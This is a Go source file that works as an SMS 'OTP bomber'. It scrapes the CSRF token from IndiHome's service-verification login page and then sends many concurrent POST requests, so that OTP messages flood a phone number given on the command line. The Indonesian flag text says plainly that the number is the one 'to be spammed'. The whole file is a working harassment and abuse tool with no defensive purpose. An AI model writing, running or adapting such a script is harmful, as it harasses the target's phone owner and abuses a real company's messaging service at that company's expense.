package main

import (
   "errors"
   "flag"
   "fmt"
   colly "github.com/gocolly/colly"
   "log"
   "os"
   "sync"
)

const url="https://www.indihome.co.id/verifikasi-layanan/login-otp"
func main(){
   var token string
   var wg sync.WaitGroup
   nomerPtr := flag.String("nomer", "", "Nomer HP yang ingin dispam \nContoh: 08xxxxxxxxx")
   countPtr :=flag.Int("count",1,"Berapa kali di spam \nContoh: 1/2/3/4/5")
   flag.Parse()
   if *nomerPtr == "" {
      flag.PrintDefaults()
      os.Exit(1)
   }
   requestData:= make(map[string]string)
   c := colly.NewCollector()
   err:=getToken(c, &token)
   if err!=nil{
      log.Fatal(err)
   }
   requestData["_token"]=token
   requestData["msisdn"]=*nomerPtr

   for i := 1; i <= *countPtr; i++ {
      wg.Add(1)
      go postRequest(i,c,requestData, &wg)
   }
   wg.Wait()
}

func getToken(c *colly.Collector ,token *string) error {
   c.OnHTML("[name=_token]", func(e *colly.HTMLElement) {
      *token=e.Attr("value")
   })
   c.Visit(url)
   if *token==""{
      return errors.New("Token not found")
   }else{
      return nil
   }
}

func postRequest(id int,c *colly.Collector ,requestData map[string]string, wg *sync.WaitGroup){
   defer wg.Done()
   fmt.Printf("Request %d starting\n", id)
   c.Post(url,requestData)
   fmt.Printf("Request %d done\n", id)

}